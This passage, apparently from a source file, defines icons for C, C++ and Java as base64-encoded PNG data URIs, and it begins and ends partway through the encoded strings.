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",
            c_icon = "data:image/png;base64,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",
            cpp_icon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAAXNSR0IArs4c6QAACtpJREFUeF7tm3tUlGUex7/PO8MMIIwIKiJ4SQUxQjBvHbSN8lJyttNumXaxzvGCZm3qpmudzWSoKC9tumbrBbe1WrSWOrsZboYS6sFQQAG5qNBIckcEhssAw8y8vz0vJgryzvvOMIOdrecf/pjnd/u8z+X3/J4Hhl94Y7/w+PErgF9HwC+cwB2ZAsvi8yYy4tcRMFXgz8BlEMNf9kWHnu/v79GvAJbuK/BmZI5hPHsJDIpbgyUQz4AEhQXrdq8Mu9pfIPoFgFabqiz391kCYnEMNNhqcAQ9GDa5trtt/2BVoNHZIJwOIHrv+dmMsI0Y7rEpGEIRGFsbvzw0ySY5Gzs7DcCK3dmBvEIRB8KTNvrUrTsBxxj4NfHLwwv6okdM1uEAXvywwMOsNK/jGV5jYGpHOE2ACYx2mZV8zP7Fk/SO0HlDh8MAaLXElfufX8R4bAFjvo50sksXUT0Y3tR7XdqZuGCBxRE2HAJg+Z7c6RbG/soB0x3hlKQOohyO2Oo9L0w8KdlXokOfACyLzw1ghHdAWATG+qTLrkB4SiIFVu2LDiuxS74zB7GjLd+T5Q64rOcZW88ANztUOE6EqIM47OY59YaPlgY326rYNgBEbPnevPkE2grGRtlqzKn9CZXEITagInSfVst4ubZkA1gWf34yEdvOgWbKVd6z31CNCkHDPTDCxxVDPFVwdeFABBg6LKhvMeHKtTYUVxlwrbnDXhMgIJOBrYlfHvq9HCXSAIhYdHzeJgKtY2CcHKW39uE4hhlBgxB5t09n4HJaSW0r0i42IL2oAWae5Ij0yB2EtJq9Fx8d+hoYs6pAEkD03tzVANtusxcAJo3W4PdTh2GYl33pQF2LCV+cqcLZy432mEdLu/GFg6um7rEmbBXAyzuK1e3qtjIwDLHFA3eVAs8/EIB7R2tsERPtm3W5EZ+cLEe7Sd7UJuJrskrKi3Ov1ASS2XMkEheIzimrAK4fWynXlii83F2wOmo0/AfJG+5ydZfWtWHnkSvQt5pERQhkLK3Tn04t0E02WXiP6x0pDAejRY/ZVgEs3Zc/g+P5NLlOergq8adHx8DPziEvZadKb8SWQzoYjLcngYZ2Y+bh7Eu+je3tI7vp4TATCctOiel2GABhsVsbdRcC/QZIxdGn34uqDHj/cAl4YfsAYOH5yycvldT/UF03pVfF/QVgXviQzgWvP9qXGdU4klOrL6yoPn/6h7IInkgparc/AHi6KhG3cDxcVdK7pIUnXKxsQWFFC/QtJggjZ7CnCkF+AxDs7yGZmgryKXm15Y9t+69be4fFRxJ4fwB4KmI4HgqR9iXnxyYknqlCbVPvi/KwgWosjPBDSIBnr3EVVbY0r/h7Wv3xCxXys1BnAxigVmDrsxOgVFhPKb4+W4Okc1eFTM1qE45Uj032RdSkoV39rjV1mN47XKDb/PW5YMkv3rODswH8Jtgbi+73t+rXicI6JJyqtMn3pQ+OwMSRnvRVVkXJkr2p/m0dZvuyKWcDWDF7JCbfNVA0uMZWMzZ8fglGs7wk5vrWTdTWYTzzffGVcZdrG60XUaWwOhvApmeC4T3ARdSNf2dW45ucWik3u343mfmCo/lFVNHQ1GsRdZyvBmGjvJGhq0VZnaGb3oggX/h5uSEpuwxG00+5gjMBqJQcPlgcYnXljvmiCFUN0tVtnqj6bEmFLqe0IgIkXlxZMy8E2567D8/97QT+mfZDNwCH189FVPgIDFt5ADWNbdd/cyYA4csLI0CsCbnKyo/ywVs50RHQVlrXkJGar5ti4nnRLGrUYA+snDMBU+4ajFn3DEdSdikKyvV4LykP4aO8MTvUH/OnjcZYXw0++LYQlQ2t2HQo17kAhPP92wvHiwIQDi+r9otXs5sNhnPJmecb6ol7CLBeUpsR5Is07W9vsxW89gs8HTEWMU9M6vabMD1GvvyZcwEIB58tz1rfmV76RwFMPRZAk8l8MeV0ZkdZVc3ETq8ZK4DGm6BSi16eDHRXYcqYwXh86mi8OGcC3v0qFykFlUgvvgpfjRvG+HoibsEUTB83BPO3p6Ba34ZTRTXOBaDgGHYuDoHwV6xtTbrcWeX5aXGvL9Tp8tPP5c0gsG53g8LSD6Xqe2i8A6FQ3EwCeij+Wa0Bgm+xTwZZPf2lFtbhwKlKU1XttfSjaafDO0xm60UCIgPUblkY6H0fgNv2fmHhdVMp0Wo0w2TpvrW6q5VwUXBoauvoLLU5fREUDAhJkJAMiTWT2UIzX0kozbhwRX76CmD8CJ+KaWFjWz49Uy6+yMjZXJ25Cwj2w0Zp8NJc67GduViByLWfoL3DLMdluKmVSN+xBGFjfJGWX9r8h4/T63MrWmwC2GXI2QCE+b/5mWBo3MRPpIIzKdklWPDWl6hv/ml/FkExzNsDn73+OB6YeDNes4XHgRMFlX88mO1abzCJD7fedDobgGDzwRAfPB0xXPLrVtY1I+bjE0j4Lg9txu6jQeOuxvNzJuL1Z2ZCgNBbq2tqpfcPndVtPlI82sJbqQHcKtwfAEzmjtw3nwi8e8RQjXhOfItTrUYT0vLLUHa1EUoFhzF+g3BvoB8GuMoSx3c5P7bOiv2qEG4evVeB+gsAEVVm5ReW5FwonhE1bRy+fvspcE6+IhRW96jXD+BIpg5gikx4eftC6dK9Duh0AASDrqws60RmznSLxdJV/v3z0zMRt+RByanQlw5b/5WO9fHHblFBJrio06EZNAmc4vZKiiOngPCQSd/UfPKb4+lBhva22ya98PE/ffV3eHZWaF9iFJU9mJqPRe/+p6sg2r0j1cDVUwcPzX3CszMH7QIF4zjeUiwoazeZ8o6eOkPVV69dT19FmjCnd62OwrJ53XPzvhL58FAWVn94BEJNUKJdxEAfc1dazVvG4fMVOjEZ63UsIrZ4V+53ORcu8dkXLkV2Hi5ltuioe7Ft5VzZC5uY2kaDEa/sTsZHR3JkWha6EUGhyoDGy4jEFyIB8ftBybtBzIoVJvVRsJ65u7Q/I4ZosDl6FhZGhti8OAp7f0JKHt7YfxxltU3Sxnr2IBIqInOQEpNqTVgagCA9O/ZhMLYPhADbPQGCAnyw5JFwzL9/AsYOH2RVRVF5HT4/Xoj9ybm4XNVgjznh2Uc5wJbi6BvJUgrkARC0PKp1R7viZRBtANB7piJlDcDIoQMRPta3E4SHm6rz0NLQ3IYrVxtxtqgKVfUtMrSIdaE2EHag3TUOp16V9VpEPoAbNiO1AVAq3gH4RVJFjD5EYo9oEji2Cslv2PReyHYAN1yb++Z0WGg7GBOOrXewUTY4xRokb7DrxZj9AISQtVoOadwigLYATnobKIqW6sC4t+A1ficS7X8z2DcAN6eFB5RsHQjCkxT7LjBkjyEygbFdINVGHHvNvqcjt9hyDIAbCue8FQhCHEB9eh9shcUxWLAGqRsd9m7YsQC6QMTOgoXbDo5seyEuHnkRQK/gWMxh2QNFZkfnABCMR2qVUHBLwIQRAXuvt/RgbBO8LNuQqLX/7ZwVGM4DcMPow1pv8FwMCC8CsF42uiFD4MFYAjjLOiRrnfrfI84H0LVtaoPBc9sAPCIxOo9DgTX4dqNNj7NkjvjbuvUfgC4QsY+C73x3OKabN0RlYGwDjm38xN5g7JHrfwCCl/N2qGHWPwmiaZ1OM5YBpVcivlklfYtqT5R3dA1wsMOOVndnRoCjo+iDvl8B9AHe/4Xo/wDSGIF9J77MdgAAAABJRU5ErkJggg==",
            java_icon = "data:image/png;base64,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